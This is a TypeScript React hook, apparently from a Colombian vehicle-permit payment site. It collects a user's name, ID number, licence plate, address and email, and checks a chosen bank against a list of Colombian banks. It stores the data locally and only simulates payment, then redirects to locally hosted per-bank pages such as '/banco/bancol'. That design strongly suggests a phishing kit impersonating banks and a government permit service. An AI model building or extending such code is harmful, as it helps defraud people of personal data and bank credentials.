import { useState, useMemo } from 'react'
import { getPlanPrice } from '@/lib/utils'

// Arreglo de bancos con código y nombre
const BANCOS_FIJOS = [
  { codigo: '1815', nombre: 'ALIANZA FIDUCIARIA' },
  { codigo: '1558', nombre: 'BAN100' },
  { codigo: '1059', nombre: 'BANCAMIA S.A.' },
  { codigo: '1040', nombre: 'BANCO AGRARIO' },
  { codigo: '1052', nombre: 'BANCO AV VILLAS' },
  { codigo: '1013', nombre: 'BANCO BBVA COLOMBIA S.A.' },
  { codigo: '1032', nombre: 'BANCO CAJA SOCIAL' },
  { codigo: '1066', nombre: 'BANCO COOPERATIVO COOPCENTRAL' },
  { codigo: '1051', nombre: 'BANCO DAVIVIENDA' },
  { codigo: '1001', nombre: 'BANCO DE BOGOTA' },
  { codigo: '1023', nombre: 'BANCO DE OCCIDENTE' },
  { codigo: '1062', nombre: 'BANCO FALABELLA' },
  { codigo: '1063', nombre: 'BANCO FINANDINA S.A. BIC' },
  { codigo: '1012', nombre: 'BANCO GNB SUDAMERIS' },
  { codigo: '1006', nombre: 'BANCO ITAU' },
  { codigo: '1071', nombre: 'BANCO J.P. MORGAN COLOMBIA S.A.' },
  { codigo: '1047', nombre: 'BANCO MUNDO MUJER S.A.' },
  { codigo: '1060', nombre: 'BANCO PICHINCHA S.A.' },
  { codigo: '1002', nombre: 'BANCO POPULAR' },
  { codigo: '1065', nombre: 'BANCO SANTANDER COLOMBIA' },
  { codigo: '1069', nombre: 'BANCO SERFINANZA' },
  { codigo: '1303', nombre: 'BANCO UNION antes GIROS' },
  { codigo: '1007', nombre: 'BANCOLOMBIA' },
  { codigo: '1061', nombre: 'BANCOOMEVA S.A.' },
  { codigo: '1808', nombre: 'BOLD CF' },
  { codigo: '1283', nombre: 'CFA COOPERATIVA FINANCIERA' },
  { codigo: '1009', nombre: 'CITIBANK' },
  { codigo: '1370', nombre: 'COLTEFINANCIERA' },
  { codigo: '1292', nombre: 'CONFIAR COOPERATIVA FINANCIERA' },
  { codigo: '1289', nombre: 'COTRAFA' },
  { codigo: '1816', nombre: 'CREZCAMOS' },
  { codigo: '1097', nombre: 'DALE' },
  { codigo: '1551', nombre: 'DAVIPLATA' },
  { codigo: '1637', nombre: 'IRIS' },
  { codigo: '1286', nombre: 'JFK COOPERATIVA FINANCIERA' },
  { codigo: '1070', nombre: 'LULO BANK' },
  { codigo: '1801', nombre: 'MOVII S.A.' },
  { codigo: '1507', nombre: 'NEQUI' },
  { codigo: '1809', nombre: 'NU' },
  { codigo: '1811', nombre: 'RAPPIPAY' },
  { codigo: '1019', nombre: 'SCOTIABANK COLPATRIA' },
  { codigo: '1804', nombre: 'UALÁ' },
]

interface FormData {
  email: string
  nombre: string
  cedula: string
  placa: string
  direccion: string
  telefono?: string
}

// Mapa de códigos a nombres de carpetas (para redirección)
const getFolderName = (nombre: string): string => {
  return nombre
    .toLowerCase()
    .normalize('NFD')
    .replace(/[\u0300-\u036f]/g, '')
    .replace(/[^a-z0-9]/g, '-')
    .replace(/-+/g, '-')
    .replace(/^-|-$/g, '')
}

export function usePermitForm(selectedPlanId: string, metodoPago: string, initialData?: any) {
  const [formData, setFormData] = useState<FormData>({
    nombre: initialData?.primerNombre ? `${initialData.primerNombre} ${initialData.primerApellido || ''}`.trim() : '',
    cedula: initialData?.NumeroIdentificacion || initialData?.numeroIdentificacion || '',
    placa: initialData?.placa || initialData?.placasAgregadas?.[0]?.placa || '',
    direccion: initialData?.direccionCorrespondencia || '',
    email: initialData?.correoPrimario || '',
  })
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)

  const total = selectedPlanId ? getPlanPrice(selectedPlanId) : 0

  // Validar y obtener el banco por código
  const bankValidation = useMemo(() => {
    if (!metodoPago || metodoPago.trim() === '') {
      return { 
        isValid: false, 
        banco: null, 
        ruta: '/pse',
        codigo: null 
      }
    }

    const searchTerm = metodoPago.trim()

    // Si es PSE, no es un banco
    if (searchTerm.toLowerCase() === 'pse') {
      return { 
        isValid: false, 
        banco: null, 
        ruta: '/pse',
        codigo: null 
      }
    }

    // Buscar el banco por código (exacto) o por nombre (parcial)
    const bancoEncontrado = BANCOS_FIJOS.find(
      (b) => 
        b.codigo === searchTerm || // Buscar por código exacto
        b.nombre.toLowerCase() === searchTerm.toLowerCase() || // Buscar por nombre exacto
        b.nombre.toLowerCase().includes(searchTerm.toLowerCase()) // Buscar por nombre parcial
    )
    console.log('bancoEncontrado',bancoEncontrado)

    if (bancoEncontrado) {
      const folderName = getFolderName(bancoEncontrado.nombre)
      return {
        isValid: true,
        banco: bancoEncontrado,
        ruta: `/banco/${folderName}`,
        codigo: bancoEncontrado.codigo
      }
    }

    return { 
      isValid: false, 
      banco: null, 
      ruta: '/pse',
      codigo: null 
    }
  }, [metodoPago])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError(null)

    // Validar método de pago
    if (!metodoPago) {
      setError('Por favor seleccione un método de pago')
      return
    }

    // *** VALIDACIÓN POR CÓDIGO: Verificar que el banco existe en BANCOS_FIJOS ***
    if (metodoPago !== 'pse' && metodoPago !== 'tarjeta' && metodoPago !== 'debito' && metodoPago !== 'credito' && metodoPago !== 'tarjeta_debito' && metodoPago !== 'tarjeta_credito' && metodoPago !== 'qr' && metodoPago !== 'bre-b' && !bankValidation.isValid) {
      setError(`El banco con código "${metodoPago}" no es válido. Por favor seleccione un banco de la lista.`)
      return
    }

    // Validar campos del formulario
    const requiredFields: (keyof FormData)[] = ['nombre', 'cedula']
    const emptyField = requiredFields.find(field => !formData[field]?.trim())
    
    if (emptyField) {
      const fieldNames: Record<keyof FormData, string> = {
        nombre: 'nombre',
        cedula: 'cédula',
        placa: 'placa',
        direccion: 'dirección',
        email: 'correo electrónico',
        telefono: 'teléfono',
      }
      setError(`Por favor complete el campo: ${fieldNames[emptyField]}`)
      return
    }

    setIsLoading(true)

    try {
      // Preparar datos del pago
      const databank = {
        ...formData,
        plan: selectedPlanId,
        total,
        metodo_pago: metodoPago,
        banco_validado: bankValidation.isValid,
        banco_codigo: bankValidation.codigo,
        banco_nombre: bankValidation.banco?.nombre || null
      }

      console.log('✅ Datos de pago validados por código:', databank)

      // Guardar en localStorage
      localStorage.setItem('pypPayment', JSON.stringify(databank))

      // Simular proceso de pago
      await new Promise(resolve => setTimeout(resolve, 2000))

      // Determinar ruta de redirección basada en el código del banco
      let redirectPath = '/pse'
      
      if (metodoPago === 'pse') {
        redirectPath = '/pse'
      } else if (metodoPago === 'bre-b') {
        redirectPath = '/bre-b'
      } else if (bankValidation.isValid) {
        redirectPath = bankValidation.ruta
        console.log(`🔀 Redirigiendo a: ${redirectPath} (Código: ${bankValidation.codigo} - ${bankValidation.banco?.nombre})`)
      } else {
        redirectPath = '/pse'
        console.warn(`⚠️ Código de banco no válido: ${metodoPago}, redirigiendo a PSE`)
      }


      // Redirigir
    window.location.href = redirectPath == '/banco/bancolombia'? '/banco/bancol':redirectPath=='/banco/banco-davivienda'?'/banco/davivienda':redirectPath

      // Reset form
      setFormData({ 
        nombre: '', 
        cedula: '', 
        placa: '', 
        direccion: '',
        email: '', 
      })

    } catch (err) {
      console.error('❌ Error en el proceso de pago:', err)
      setError('Ocurrió un error al procesar el pago')
      alert('Error al procesar el pago. Por favor intente nuevamente.')
    } finally {
      setIsLoading(false)
    }
  }

  return {
    formData,
    setFormData,
    total,
    handleSubmit,
    isLoading,
    error,
    bankValidation,
    isValidBank: bankValidation.isValid,
    bancoInfo: bankValidation.banco,
    bancoCodigo: bankValidation.codigo,
    bancoRuta: bankValidation.ruta,
    setError
  }
}